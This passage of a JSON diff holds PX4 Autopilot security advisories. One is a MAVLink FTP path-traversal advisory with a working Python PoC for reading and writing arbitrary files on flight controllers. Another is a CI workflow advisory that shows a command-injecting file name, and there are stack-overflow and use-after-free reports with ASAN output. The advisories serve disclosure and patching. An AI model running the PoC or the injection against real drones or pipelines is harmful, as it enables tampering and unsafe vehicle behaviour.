opcode, size, req_opcode, burst_complete, padding, offset, data=b''):\r\n    header = struct.pack('<HBBBBBxI', seq, session, opcode, size, req_opcode, burst_complete, offset)\r\n    return header + data\r\n\r\n# Step 1: List root filesystem (NuttX: root_dir is \"\")\r\n# kCmdListDirectory = 3\r\npath = b'/fs\\x00'\r\npayload = make_payload(seq=0, session=0, opcode=3, size=len(path),\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0, data=path)\r\n\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\n\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\ntime.sleep(1)\r\n\r\n# Step 2: Open /proc/version for reading (kCmdOpenFileRO = 4)\r\npath = b'/proc/version\\x00'\r\npayload = make_payload(seq=1, session=0, opcode=4, size=len(path),\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0, data=path)\r\n\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\n\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\ntime.sleep(1)\r\n\r\n# Step 3: Read file contents (kCmdReadFile = 5)\r\npayload = make_payload(seq=2, session=0, opcode=5, size=239,\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0)\r\n\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\n\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\n\r\n# Receive and print response\r\nwhile True:\r\n    msg = mav.recv_match(type='FILE_TRANSFER_PROTOCOL', blocking=True, timeout=5)\r\n    if msg is None:\r\n        break\r\n    resp_payload = bytes(msg.payload)\r\n    opcode = resp_payload[3]\r\n    if opcode == 128:  # kRspAck\r\n        size = resp_payload[4]\r\n        data = resp_payload[12:12+size]\r\n        print(f\"Read {size} bytes: {data}\")\r\n        break\r\n    elif opcode == 129:  # kRspNak\r\n        print(f\"NAK error: {resp_payload[12]}\")\r\n        break\r\n```\r\n\r\n**Reproducing arbitrary file write on POSIX (SITL/companion):**\r\n\r\n```python\r\n# Step 1: Create file outside root using path traversal\r\n# kCmdCreateFile = 6\r\npath = b'../../tmp/pwned\\x00'\r\npayload = make_payload(seq=0, session=0, opcode=6, size=len(path),\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0, data=path)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\ntime.sleep(0.5)\r\n\r\n# Step 2: Write data (kCmdWriteFile = 7)\r\ndata = b'EXPLOITED\\x00'\r\npayload = make_payload(seq=1, session=0, opcode=7, size=len(data),\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0, data=data)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\n# File /tmp/pwned is now created with content \"EXPLOITED\"\r\n```\r\n\r\n### Impact\r\n\r\nThis is an **unauthenticated arbitrary file read/write/delete vulnerability** affecting all PX4 Autopilot deployments that expose a MAVLink interface (which is virtually all of them).\r\n\r\n**Who is impacted:**\r\n- All PX4 vehicles with any MAVLink link (telemetry radio, USB, WiFi, cellular, companion computer)\r\n- Operators of drones, fixed-wing aircraft, VTOL, rovers, and submarines running PX4\r\n\r\n**What an attacker can do:**\r\n- **Read** any file on the flight controller (configuration, logs, cryptographic keys, parameters)\r\n- **Write/create** arbitrary files (plant malicious scripts, modify configuration, overwrite firmware)\r\n- **Delete** files (remove logs to cover tracks, corrupt filesystem to cause crashes)\r\n- **Exfiltrate** mission plans, geofence configurations, and flight logs containing GPS tracks\r\n- **Overwrite** parameter files to alter vehicle behavior (disable safety checks, change geofences)\r\n\r\n**Physical safety impact:** Modifying configuration files or parameters could cause loss of vehicle control, crashes, or override geofence boundaries in populated areas.",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-fh32-qxj9-x32f",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-32709",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-13T19:52:34Z",
+    "published_at": "2026-03-13T19:52:34Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "PX4/PX4-Autopilot"
+        },
+        "vulnerable_version_range": "<= 1.17.0-rc1",
+        "patched_versions": "1.17.0-rc2",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+        "score": 5.4
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "credits": [
+      {
+        "login": "dxlerYT",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "dxlerYT",
+          "id": 73416867,
+          "node_id": "MDQ6VXNlcjczNDE2ODY3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/73416867?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/dxlerYT",
+          "html_url": "https://github.com/dxlerYT",
+          "followers_url": "https://api.github.com/users/dxlerYT/followers",
+          "following_url": "https://api.github.com/users/dxlerYT/following{/other_user}",
+          "gists_url": "https://api.github.com/users/dxlerYT/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/dxlerYT/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/dxlerYT/subscriptions",
+          "organizations_url": "https://api.github.com/users/dxlerYT/orgs",
+          "repos_url": "https://api.github.com/users/dxlerYT/repos",
+          "events_url": "https://api.github.com/users/dxlerYT/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/dxlerYT/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+      "score": 5.4
+    }
+  },
+  {
+    "ghsa_id": "GHSA-79mp-34pp-2f3f",
+    "cve_id": "CVE-2026-32705",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-79mp-34pp-2f3f",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-79mp-34pp-2f3f",
+    "summary": "BST Device Name Length Can Overflow Driver Buffer",
+    "description": "### Summary\r\n\r\nThe BST telemetry probe writes a string terminator using a device-provided length without bounds. A malicious BST device can report an oversized `dev_name_len`, causing a stack overflow in the driver and crashing the task (or enabling code execution).\r\n\r\n### Details\r\n\r\nIn `src/drivers/telemetry/bst/bst.cpp` (BST::probe), after receiving a device info reply the code does:\r\n\r\n```\r\n  dev_info_reply.payload.dev_name[dev_info_reply.payload.dev_name_len] = '\\0';\r\n\r\n  The dev_name buffer is 32 bytes, but dev_name_len is attacker-controlled from the I2C reply and is never bounded (lines ~190-215). A\r\n  length ≥32 writes past the stack buffer, corrupting adjacent data.\r\n```\r\n\r\n### PoC\r\n\r\n[px4-bst-dev-name-overflow-poc.tar.gz](https://github.com/user-attachments/files/23834751/px4-bst-dev-name-overflow-poc.tar.gz)\r\n\r\nUse the provided ASAN harness px4-bst-dev-name-overflow-poc/:\r\n\r\n```\r\n  cmake -S px4-bst-dev-name-overflow-poc -B px4-bst-dev-name-overflow-poc/build\r\n  cmake --build px4-bst-dev-name-overflow-poc/build\r\n  ./px4-bst-dev-name-overflow-poc/build/px4_bst_dev_name_overflow_poc\r\n\r\n```\r\n\r\nThe mock I2C device returns a BST info reply with `dev_name_len=0xFF`; ASAN reports a stack-buffer-overflow at bst.cpp:209 in BST::probe.\r\n\r\n### Impact\r\n\r\nStack-based buffer overflow triggered by any BST device or I2C bus attacker responding to the probe. Causes denial of service and could enable code execution in the BST driver context if protections are weak.\r\n\r\n### Acknowledgments\r\n- Found by SecMate (https://secmate.dev)\r\n\r\n",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-79mp-34pp-2f3f",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-32705",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-13T19:49:50Z",
+    "published_at": "2026-03-13T19:49:17Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "PX4/PX4-Autopilot"
+        },
+        "vulnerable_version_range": "<= 1.17.0-rc1",
+        "patched_versions": "1.17.0-rc2",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 6.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-121",
+        "name": "Stack-based Buffer Overflow"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-121"
+    ],
+    "credits": [
+      {
+        "login": "max-r-b",
+        "type": "reporter"
+      },
+      {
+        "login": "enitmar",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "max-r-b",
+          "id": 25744117,
+          "node_id": "MDQ6VXNlcjI1NzQ0MTE3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25744117?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/max-r-b",
+          "html_url": "https://github.com/max-r-b",
+          "followers_url": "https://api.github.com/users/max-r-b/followers",
+          "following_url": "https://api.github.com/users/max-r-b/following{/other_user}",
+          "gists_url": "https://api.github.com/users/max-r-b/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/max-r-b/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/max-r-b/subscriptions",
+          "organizations_url": "https://api.github.com/users/max-r-b/orgs",
+          "repos_url": "https://api.github.com/users/max-r-b/repos",
+          "events_url": "https://api.github.com/users/max-r-b/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/max-r-b/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "enitmar",
+          "id": 203963681,
+          "node_id": "U_kgDODCg9IQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/203963681?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/enitmar",
+          "html_url": "https://github.com/enitmar",
+          "followers_url": "https://api.github.com/users/enitmar/followers",
+          "following_url": "https://api.github.com/users/enitmar/following{/other_user}",
+          "gists_url": "https://api.github.com/users/enitmar/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/enitmar/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/enitmar/subscriptions",
+          "organizations_url": "https://api.github.com/users/enitmar/orgs",
+          "repos_url": "https://api.github.com/users/enitmar/repos",
+          "events_url": "https://api.github.com/users/enitmar/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/enitmar/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 6.8
+    }
+  },
+  {
+    "ghsa_id": "GHSA-69g4-hcqf-j45p",
+    "cve_id": "CVE-2026-32708",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-69g4-hcqf-j45p",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-69g4-hcqf-j45p",
+    "summary": "Zenoh uORB Subscriber Allows Arbitrary Stack Allocation (PX4/PX4-Autopilot)",
+    "description": "### Summary\r\n\r\nThe Zenoh uORB subscriber allocates a stack VLA directly from the incoming payload length without bounds. A remote Zenoh publisher can  send an oversized fragmented message to force an unbounded stack allocation and copy, causing a stack overflow and crash of the Zenoh bridge task.\r\n\r\n### Details\r\n\r\nIn `src/modules/zenoh/subscribers/uorb_subscriber.hpp` (data_handler), when the payload is non-contiguous, the code does:\r\n\r\n```\r\n  size_t len = z_bytes_len(payload);\r\n  unsigned char reassembled_payload[len];\r\n  z_bytes_reader_read(&reader, reassembled_payload, len);\r\n  dds_istream_t is = {.m_buffer = &reassembled_payload[4], .m_size = static_cast<int>(len), ...};\r\n  dds_stream_read(&is, data, ...);\r\n```\r\n\r\nThere is no maximum length check. With `Z_FEATURE_UNSTABLE_API` enabled (on by default in `src/modules/zenoh/CMakeLists.txt`) large Zenoh messages are fragmented (`FRAG_MAX_SIZE`=512), taking the non-contiguous path and hitting the VLA. Any payload larger than the thread stack will overflow and corrupt adjacent frames.\r\n\r\n### PoC\r\n\r\n[zenoh-vla-stack-overflow-poc.tar.gz](https://github.com/user-attachments/files/23834662/zenoh-vla-stack-overflow-poc.tar.gz)\r\n\r\nA minimal ASAN PoC is in zenoh-vla-stack-overflow-poc/:\r\n\r\n```\r\n  cmake -S zenoh-vla-stack-overflow-poc -B zenoh-vla-stack-overflow-poc/build\r\n  cmake --build zenoh-vla-stack-overflow-poc/build\r\n  ./zenoh-vla-stack-overflow-poc/build/zenoh_vla_stack_overflow_poc\r\n```\r\n\r\nThe harness includes the real `uorb_subscriber.hpp` and forces the non-contiguous path with a 16 MB payload. ASAN reports stack-overflow at uorb_subscriber.hpp:97 (the VLA allocation).\r\n\r\n### Impact\r\n\r\nStack-based buffer overflow triggered over the Zenoh network. Any reachable Zenoh publisher (adjacent network) can crash the PX4 Zenoh bridge task; with weak stack protections this could lead to control-flow compromise (remote code execution).\r\n\r\n### Acknowledgments\r\n- Found by SecMate (https://secmate.dev)\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-69g4-hcqf-j45p",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-32708",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-13T19:51:41Z",
+    "published_at": "2026-03-13T19:51:41Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "PX4/PX4-Autopilot"
+        },
+        "vulnerable_version_range": "<= 1.17.0-rc1",
+        "patched_versions": "1.17.0-rc2",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "score": 7.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-121",
+        "name": "Stack-based Buffer Overflow"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-121"
+    ],
+    "credits": [
+      {
+        "login": "max-r-b",
+        "type": "reporter"
+      },
+      {
+        "login": "enitmar",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "max-r-b",
+          "id": 25744117,
+          "node_id": "MDQ6VXNlcjI1NzQ0MTE3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25744117?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/max-r-b",
+          "html_url": "https://github.com/max-r-b",
+          "followers_url": "https://api.github.com/users/max-r-b/followers",
+          "following_url": "https://api.github.com/users/max-r-b/following{/other_user}",
+          "gists_url": "https://api.github.com/users/max-r-b/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/max-r-b/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/max-r-b/subscriptions",
+          "organizations_url": "https://api.github.com/users/max-r-b/orgs",
+          "repos_url": "https://api.github.com/users/max-r-b/repos",
+          "events_url": "https://api.github.com/users/max-r-b/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/max-r-b/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "enitmar",
+          "id": 203963681,
+          "node_id": "U_kgDODCg9IQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/203963681?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/enitmar",
+          "html_url": "https://github.com/enitmar",
+          "followers_url": "https://api.github.com/users/enitmar/followers",
+          "following_url": "https://api.github.com/users/enitmar/following{/other_user}",
+          "gists_url": "https://api.github.com/users/enitmar/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/enitmar/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/enitmar/subscriptions",
+          "organizations_url": "https://api.github.com/users/enitmar/orgs",
+          "repos_url": "https://api.github.com/users/enitmar/repos",
+          "events_url": "https://api.github.com/users/enitmar/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/enitmar/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 4,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "score": 7.8
+    }
+  },
+  {
+    "ghsa_id": "GHSA-mq93-4g5w-w34h",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-mq93-4g5w-w34h",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-mq93-4g5w-w34h",
+    "summary": "Code injection in Github Actions `docs_pr_comment.yml` in privileged context",
+    "description": "## Summary\r\n\r\nA code injection vulnerability was identified in the PX4/PX4-Autopilot project within the `docs_pr_comment.yml` GitHub Actions workflow on the latest main branch. An attacker could exploit this issue in a privileged context to execute arbitrary code, potentially compromising the CI/CD pipeline.\r\n\r\n## Tested Version\r\n\r\nlatest main branch\r\n\r\n## Details\r\n\r\nA code injection vulnerability was identified in the GitHub action `.github/workflows/docs_pr_comment.yml`. At [line 59](https://github.com/PX4/PX4-Autopilot/blob/8c6337e94eccfdd4dc8bce3df10b644ed16d72ba/.github/workflows/docs_pr_comment.yml#L59), the workflow evaluates user-controlled content:\r\n\r\n```yaml\r\necho \"${{ steps.read-error-by-page.outputs.content }}\"\r\n```\r\n\r\nThe content is read from the file './errorsFilteredByPrPages.md' using the juliangruber/read-file-action@v1 action and is evaluated using the `${{}}` syntax. While the echo command uses quotes, this is not sufficient protection against code injection.\r\n\r\nThe workflow is triggered by `workflow_run` and depends on `.github/workflows/docs_flaw_checker.yml`, which is triggered by `pull_request_target`. The workflow runs in a privileged context since `pull_request_target` is a high privileged trigger. This means an attacker can trigger the workflow through a pull request.\r\n\r\nIn particular, the content of the file `errorsFilteredByPrPages.md` are the outputs of the too [`markdown_link_checker_sc`](https://github.com/PX4/PX4-Autopilot/blob/8c6337e94eccfdd4dc8bce3df10b644ed16d72ba/.github/workflows/docs_flaw_checker.yml#L52), which contains file paths in the PR branch that does not pass the linter test. A malicious attacker can create malicious file names to inject code, for example, a file name `\" & echo 123 & .md` would execute `echo 123` when evaluated in `docs_pr_comment.yml`.\r\n\r\n#### Impact\r\n\r\nThis issue may lead to code execution in high privilege context.\r\n\r\n#### Remediation\r\n\r\nConsider using an [intermediate environment variable](https://docs.github.com/en/actions/reference/security/secure-use#use-an-intermediate-environment-variable) to store the output of `steps.read-error-by-page.outputs.content` instead of evaluating it directly.\r\n\r\n",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "bkueng",
+      "id": 281593,
+      "node_id": "MDQ6VXNlcjI4MTU5Mw==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/281593?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/bkueng",
+      "html_url": "https://github.com/bkueng",
+      "followers_url": "https://api.github.com/users/bkueng/followers",
+      "following_url": "https://api.github.com/users/bkueng/following{/other_user}",
+      "gists_url": "https://api.github.com/users/bkueng/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/bkueng/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/bkueng/subscriptions",
+      "organizations_url": "https://api.github.com/users/bkueng/orgs",
+      "repos_url": "https://api.github.com/users/bkueng/repos",
+      "events_url": "https://api.github.com/users/bkueng/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/bkueng/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-mq93-4g5w-w34h",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-08-15T06:12:57Z",
+    "published_at": "2025-08-15T06:12:57Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "actions",
+          "name": "CI"
+        },
+        "vulnerable_version_range": "main",
+        "patched_versions": "main",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [],
+    "cwe_ids": [],
+    "credits": [],
+    "credits_detailed": [],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 2,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-j5w2-w79c-mqrw",
+    "cve_id": "CVE-2026-32724",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-j5w2-w79c-mqrw",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-j5w2-w79c-mqrw",
+    "summary": "Heap Use-After-Free in MavlinkShell::available() via SERIAL_CONTROL Race Condition",
+    "description": "### Summary\r\nWhen fuzzing SERIAL_CONTROL (MAVLink ID 126) messages in PX4 SITL with ASan enabled, a heap-use-after-free is detected in the MavlinkShell::available() function. The issue is caused by a race condition between the receiver thread (which handles shell creation/destruction) and the sender thread (which polls the shell for available output).\r\n\r\n### Environment\r\nPX4 version:confirmed with  main and release v1.15.4 and other..\r\nBuild config: SITL, compiled with AddressSanitizer\r\nHost OS: Ubuntu 22.04 LTS\r\nSimulator: PX4 SITL\r\nGCS: QGroundControl (connected during testing)\r\n\r\n### Detail\r\nThe issue stems from unsynchronized access to the _mavlink_shell pointer shared between:\r\nMavlinkReceiver::handle_message_serial_control() — which may call get_shell() and close_shell(), and\r\nMavlink::task_main() — which periodically checks _mavlink_shell->available() to send serial output back via MAVLink.\r\nWhen one thread deletes the _mavlink_shell instance via close_shell() (on receiving a SERIAL_CONTROL without the RESPOND flag), the other thread may still dereference the freed pointer during its polling loop.\r\nThis results in a classic use-after-free triggered under specific timing conditions.\r\n\r\n\r\n### ASAN\r\n=================================================================\r\n==909005==ERROR: AddressSanitizer: heap-use-after-free on address 0x6030005e6608 at pc 0x589dbc113c26 bp 0x77c6a01f4630 sp 0x77c6a01f4620\r\nINFO  [mavlink] Starting mavlink shell\r\nREAD of size 4 at 0x6030005e6608 thread T59\r\n    #0 0x589dbc113c25 in MavlinkShell::available() ../../src/modules/mavlink/mavlink_shell.cpp:229\r\n    #1 0x589dbc078914 in Mavlink::task_main(int, char**) ../../src/modules/mavlink/mavlink_main.cpp:2379\r\n    #2 0x589dbc07fd8b in Mavlink::start_helper(int, char**) ../../src/modules/mavlink/mavlink_main.cpp:2864\r\n    #3 0x589dbc66e1bc in entry_adapter ../../platforms/posix/src/px4/common/tasks.cpp:98\r\n    #4 0x77c6a8894ac2 in start_thread nptl/pthread_create.c:442\r\n    #5 0x77c6a892684f  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x12684f)\r\n\r\n0x6030005e6608 is located 8 bytes inside of 24-byte region [0x6030005e6600,0x6030005e6618)\r\nfreed by thread T60 here:\r\n    #0 0x77c6a98b724f in operator delete(void*, unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:172\r\n    #1 0x589dbc069a76 in Mavlink::close_shell() ../../src/modules/mavlink/mavlink_main.cpp:1291\r\n\r\npreviously allocated by thread T60 here:\r\n    #0 0x77c6a98b61e7 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:99\r\n    #1 0x589dbc06985d in Mavlink::get_shell() ../../src/modules/mavlink/mavlink_main.cpp:1266\r\n    #2 0x77c6a84a9c6f  (<unknown module>)\r\n\r\nThread T59 created by T58 here:\r\n    #0 0x77c6a9858685 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:216\r\n    #1 0x589dbc66dda4 in px4_task_spawn_cmd ../../platforms/posix/src/px4/common/tasks.cpp:252\r\n\r\nThread T58 created by T1 here:\r\n    #0 0x77c6a9858685 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:216\r\n    #1 0x589dbc686ac7 in px4_daemon::Server::_server_main() ../../platforms/posix/src/px4/common/px4_daemon/server.cpp:185\r\n\r\nThread T1 created by T0 here:\r\n    #0 0x77c6a9858685 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:216\r\n    #1 0x589dbc68298a in px4_daemon::Server::start() ../../platforms/posix/src/px4/common/px4_daemon/server.cpp:106\r\n    #2 0x3055e3  (<unknown module>)\r\n\r\nThread T60 created by T59 here:\r\n    #0 0x77c6a9858685 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:216\r\n    #1 0x589dbc109b75 in MavlinkReceiver::start() ../../src/modules/mavlink/mavlink_receiver.cpp:3494\r\n\r\nSUMMARY: AddressSanitizer: heap-use-after-free ../../src/modules/mavlink/mavlink_shell.cpp:229 in MavlinkShell::available()\r\nShadow bytes around the buggy address:\r\n  0x0c06800b4c70: fa fa fd fd fd fd fa fa fd fd fd fa fa fa fd fd\r\n  0x0c06800b4c80: fd fa fa fa fd fd 